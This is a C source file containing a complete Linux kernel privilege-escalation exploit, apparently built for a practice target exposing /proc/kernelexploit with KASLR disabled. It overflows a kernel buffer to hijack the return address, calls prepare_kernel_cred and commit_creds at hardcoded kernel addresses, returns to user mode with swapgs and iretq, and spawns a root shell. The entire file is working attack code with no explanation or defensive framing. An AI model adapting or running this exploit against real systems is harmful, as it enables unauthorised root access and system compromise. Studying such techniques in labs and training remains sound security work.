#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;// 8 bytes register

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void shell(void){

    if (getuid() != 0) {
        printf("UID = %d :-(\n", getuid());
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) shell;

void escalate_privileges(void){
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "call 0xffffffff81067d80;" // prepare_kernel_cred KASLR is disabled.
        "mov rdi, rax;"
        "call 0xffffffff81067be0;" // commit_creds
        "swapgs;"
        "push user_ss;"
        "push user_sp;"
        "push user_rflags;"
        "push user_cs;"
        "push user_rip;"
        "iretq;"
        ".att_syntax;"
    );
}

int main() {

    save_state();

    unsigned long payload[40] = { 0 };
    payload[3] = (unsigned long) escalate_privileges; // OVERFLOW int 24 offset unsigned long is 8 bytes 24/8 found rip 

    int fd = open("/proc/kernelexploit", O_RDWR);
    if (fd < 0) {
        puts("Failed to open /proc/kernelexploit");
        exit(-1);
    }

    write(fd, payload, sizeof(payload));

    return 0;
}

